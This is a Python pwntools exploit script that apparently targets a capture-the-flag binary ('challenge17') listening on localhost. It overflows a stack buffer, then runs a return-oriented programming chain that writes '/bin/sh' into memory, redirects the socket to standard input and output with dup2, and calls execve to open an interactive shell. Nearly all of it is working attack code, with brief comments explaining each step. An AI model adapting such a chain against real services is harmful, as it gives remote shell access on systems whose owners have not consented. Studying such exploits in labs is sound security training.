#!/usr/bin/python

import struct
from pwn import *

e = ELF("./challenge17")
tube = connect("localhost", 5002)

# offset to SIP
offset = 152

# writeable data addr
sh_addr = 0x602100


# gadgets 

# 0x0000000000400c91: pop rax; ret; 
pop_rax = 0x0000000000400c91

# 0x0000000000400eb3: pop rdi; ret;
pop_rdi = 0x0000000000400eb3

# 0x0000000000400eb1: pop rsi; pop r15; ret;
pop_rsi_r15 = 0x0000000000400eb1

# 0x0000000000400c93: syscall; ret; 
syscall = 0x0000000000400c93

# 0x00000000004009a0: pop rbp; ret;
pop_rbp = 0x00000000004009a0

# 0x0000000000400c8e: mov dword ptr [rbp - 8], eax; pop rax; ret; 
mov_ptr_rbp_eax = 0x0000000000400c8e

# the string "/bin/sh" as two 4-byte integer in little endian 
binsh1 = 0x6e69622f
binsh2 = 0x0068732f 

def write2mem(data, location):
	chain = ""

	chain += p64( pop_rax )
	chain += p64( data )

	chain += p64( pop_rbp )
	chain += p64( location + 8)

	chain += p64( mov_ptr_rbp_eax)
	chain += p64( 0xdeadbeef1 )	# pop rax

	return chain


def doBof(payload):
        print tube.recvuntil("> ")
        tube.send("1");

        print tube.recv()
        tube.send(str(len(payload)));

        print tube.recv()
        tube.send(payload)

        print tube.recv()

	tube.interactive()


payload = "A" * offset

# write "/bin/sh" to sh_addr
# the write2mem gadget uses "eax", 4 bytes, 
# so we have to write the string as 2 x 4 bytes
payload += write2mem(binsh1, sh_addr)
payload += write2mem(binsh2, sh_addr+4)


# Start ROP chain 

# dup2() syscall is 33

# dup2(4, 0)
payload += p64 ( pop_rax ) 
payload += p64 ( 33 )
payload += p64 ( pop_rdi ) 
payload += p64 ( 4 )
payload += p64 ( pop_rsi_r15)
payload += p64 ( 0 )
payload += p64 ( 0xdeadbeef1 )
payload += p64 ( syscall ) 


# dup2(4, 1)
payload += p64 ( pop_rax ) 
payload += p64 ( 33 )
payload += p64 ( pop_rdi ) 
payload += p64 ( 4 )
payload += p64 ( pop_rsi_r15)
payload += p64 ( 1 )
payload += p64 ( 0xdeadbeef2 )
payload += p64 ( syscall ) 


# dup2(4, 2)
payload += p64 ( pop_rax ) 
payload += p64 ( 33 )
payload += p64 ( pop_rdi ) 
payload += p64 ( 4 )
payload += p64 ( pop_rsi_r15)
payload += p64 ( 2 )
payload += p64 ( 0xdeadbeef3 )
payload += p64 ( syscall ) 


# execve 
payload += p64 ( pop_rdi )
payload += p64 ( sh_addr )
payload += p64 ( pop_rsi_r15 )
payload += p64 ( 0x6020e0 )
payload += p64 ( 0xdeadbeef4 )
payload += p64 ( pop_rax)
payload += p64 ( 59 )
payload += p64 ( syscall )

# if it crashes here (rip=0x41414141),
# something went wrong. the syscall did not
# execute correctly. 
payload += p64 ( 0x41414141 ) 

doBof(payload)

